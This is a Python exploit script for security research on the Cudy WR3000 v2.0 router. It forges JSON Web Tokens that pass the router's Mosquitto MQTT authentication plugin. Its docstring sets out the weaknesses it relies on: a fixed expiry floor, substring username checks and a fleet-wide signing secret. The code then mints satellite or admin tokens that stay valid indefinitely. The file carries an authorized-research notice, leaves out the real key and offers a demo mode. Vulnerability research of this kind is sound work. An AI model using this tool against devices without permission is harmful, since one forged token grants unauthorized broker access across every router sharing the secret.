#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 ShibbityShwab
"""
forge_jwt.py - mint a token that the Cudy WR3000 v2.0 Mosquitto JWT plugin accepts.

AUTHORIZED RESEARCH ONLY. Use this only on hardware you own or have explicit written
permission to test. The findings are documented in ../writeups/.

The plugin (mosquitto_auth_unpwd_check @ 0x3318 in firmware 2.4.15) checks:
  1. MQTT username contains the bdinfo deviceid (cudydevice)  (strstr)
  2. password verifies as HS256/384/512 JWT signed with bdinfo "secret"
  3. "exp" grant >= 1577826000  (a fixed floor; never compared to now)
  4. "username" grant contains the bdinfo deviceid              (strstr)
It then returns SUCCESS. acl_check() returns MOSQ_ERR_PLUGIN_DEFER (17), so
the broker's /etc/mosquitto/aclfile.conf is enforced. The ACL usernames are
exact: "cudydevice" (satellite) and "admincudydevice" (admin).

The plugin's HMAC key is the fleet-wide "secret" from the bdinfo partition, so the
token authenticates against every WR3000 v2.0 unit from the same firmware line.
This tool never contains that key: pass your own unit's secret, or use --demo.

Usage:
    python3 forge_jwt.py --demo
    python3 forge_jwt.py --deviceid cudydevice --role satellite --secret '<your unit secret>'
    python3 forge_jwt.py --deviceid cudydevice --role admin --secret '<your unit secret>'

Requires: pyjwt  (pip install pyjwt)
"""
import argparse
import base64
import json

EXP_FLOOR = 1577826000          # 2019-12-31T21:00:00Z, hard-coded in the plugin
DEFAULT_EXP = 1999999999        # 2033 - anything above the floor works, forever
DEMO_SECRET = "PLACEHOLDER-SECRET-FOR-DEMO"
ROLES = {"satellite": "cudydevice", "admin": "admincudydevice"}


def b64url(seg: bytes) -> str:
    return base64.urlsafe_b64encode(seg).rstrip(b"=").decode()


def forge(deviceid: str, secret: str, exp: int = DEFAULT_EXP,
          username: str | None = None) -> str:
    """Mint an HS256 token; username defaults to the bdinfo deviceid."""
    import jwt
    if username is None:
        username = deviceid
    if deviceid not in username:
        raise ValueError(f"username {username!r} must contain the bdinfo deviceid {deviceid!r}")
    payload = {"exp": exp, "username": username}
    return jwt.encode(payload, secret, algorithm="HS256")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--deviceid", default="cudydevice",
                    help="bdinfo deviceid the plugin checks for (default cudydevice)")
    ap.add_argument("--role", choices=tuple(ROLES), default="satellite",
                    help="ACL role; sets the exact MQTT username")
    ap.add_argument("--username", help="override the exact ACL username (must contain --deviceid)")
    ap.add_argument("--secret", help="bdinfo 'secret' value (the HMAC key); omit for demo mode")
    ap.add_argument("--exp", type=int, default=DEFAULT_EXP)
    ap.add_argument("--demo", action="store_true",
                    help="use a placeholder secret and verify the round-trip; nothing is sent")
    args = ap.parse_args()

    demo = args.demo or not args.secret
    secret = args.secret or DEMO_SECRET
    if demo and args.secret:
        print("[!] --demo given with --secret; using the placeholder anyway")
        secret = DEMO_SECRET
    if demo:
        print("[*] demo mode: placeholder secret, no network, no device contact")

    username = args.username or ROLES[args.role]
    try:
        token = forge(args.deviceid, secret, args.exp, username=username)
    except ValueError as exc:
        raise SystemExit(f"[!] {exc}")
    print(f"[+] token:\n{token}\n")

    hdr_b64, pl_b64, sig_b64 = token.split(".")
    print("header  :", json.loads(base64.urlsafe_b64decode(hdr_b64 + "==")))
    print("payload :", json.loads(base64.urlsafe_b64decode(pl_b64 + "==")))

    import jwt
    verified = jwt.decode(token, secret, algorithms=["HS256"])
    ok_exp = verified["exp"] >= EXP_FLOOR
    ok_user = args.deviceid in verified["username"]
    print("[+] self-verify HS256: OK")
    print(f"[+] exp {verified['exp']} >= floor {EXP_FLOOR}: {'OK' if ok_exp else 'FAIL'}")
    print(f"[+] username grant contains deviceid: {'OK' if ok_user else 'FAIL'}")
    if ok_exp and ok_user:
        print("\n[*] MQTT usage:  username = %r  password = <token>  role = %s"
              % (username, args.role))
        if not demo:
            print("[*] the same token authenticates against any WR3000 v2.0 node that")
            print("    shares the secret (fleet-wide key). Use your own hardware only.")


if __name__ == "__main__":
    main()
